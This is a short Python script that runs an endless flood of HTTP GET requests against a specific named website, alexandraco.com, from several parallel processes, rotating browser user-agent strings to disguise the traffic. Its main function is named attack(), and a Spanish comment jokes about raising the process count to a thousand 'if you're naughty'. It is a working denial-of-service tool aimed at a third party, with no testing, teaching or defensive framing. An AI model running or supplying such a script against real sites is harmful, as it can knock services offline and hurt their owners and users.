""" import requests

url = "https://www.alexandraco.com/"

while True:
    response = requests.get(url)
    print(response.text) """

import multiprocessing
import requests
import random

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X)"
]

url = "https://www.alexandraco.com/"

def attack():
    while True:
        try:
            headers = {"User-Agent": random.choice(user_agents)}
            response = requests.get(url, headers=headers)
            print(response.status_code)
        except Exception as e:
            print("Error:", e)

if __name__ == "__main__":
    process_count = 5  # Puedes cambiar a mil si eres travieso 🐙

    for _ in range(process_count):
        p = multiprocessing.Process(target=attack)
        p.start()
